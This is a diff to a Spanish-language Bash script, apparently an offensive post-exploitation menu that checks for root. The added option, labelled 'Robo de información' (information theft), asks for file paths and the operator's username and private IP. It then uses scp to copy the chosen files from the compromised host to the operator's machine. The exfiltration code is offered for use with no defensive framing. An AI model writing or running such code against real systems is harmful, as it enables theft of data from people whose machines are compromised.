@@ -253,6 +253,25 @@ if [ "$(id -u)" = "0" ]; then
 
         ;;
 
+        3 ) echo -e "\n$blueColour-> Robo de información$endColour\n"
+            sleep 2
+            echo -e -n "$yellowColour-> Ruta exacta de los archivos a transferir [desde /home/]:$endColour "
+            read ruta_files
+            echo -e -n "\n$yellowColour-> Ruta de ubicación (de tu equipo) donde quieres guardar los archivos [desde /home/]:$endColour "
+            read ruta_local
+            echo -e -n "\n$yellowColour-> Indica el nombre de usuario de tu equipo:$endColour "
+            read my_username
+            echo -e -n "\n$yellowColour-> Indica tu ip privada:$endColour "
+            read mi_ip_privada
+            sleep 2
+            echo -e "\n$yellowColour-> Transfiriendo archivos...$endColour"
+            sleep 3
+            scp $ruta_files $my_username@$mi_ip_privada:$ruta_local
+            echo -e "$yellowColour-> Archivos transferidos correctamente$endColour"
+            sleep 3
+            
+        ;;
+
         * ) echo "Opcion incorrecta"
             sleep 2
           break
